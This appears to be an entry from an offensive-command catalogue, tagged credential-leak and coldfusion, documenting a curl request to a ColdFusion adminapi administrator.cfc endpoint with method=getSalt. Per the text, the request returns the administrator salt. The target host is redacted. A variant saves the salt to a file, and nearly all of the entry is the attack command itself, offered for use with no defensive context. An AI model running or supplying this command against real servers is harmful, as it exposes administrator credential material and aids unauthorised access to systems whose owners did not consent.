---
data: 'curl https://█████████/████████/adminapi/administrator.cfc?method=getSalt'
tags:
  - credential-leak
  - coldfusion
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.664Z'
id: c56af756-e877-4fbf-ba5e-753778c9bd09
verified: false
validated: true
submitted: true
---
# curl-retrieve-salt

## Command

```bash
curl https://█████████/████████/adminapi/administrator.cfc?method=getSalt
```

## Description

This command sends a GET request to the exposed getSalt method in the ColdFusion CFC, returning the administrator salt value directly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `?method=getSalt` | URL parameter to invoke the salt retrieval method | Yes |
| `https://...` | Target CFC endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl https://█████████/████████/adminapi/administrator.cfc?method=getSalt
```

### Advanced Usage

```bash
curl -s https://█████████/████████/adminapi/administrator.cfc?method=getSalt > salt.txt
```

## Expected Output

Plain text salt value, such as "███████", in the response body.

## Related

- [[Related Procedure]]
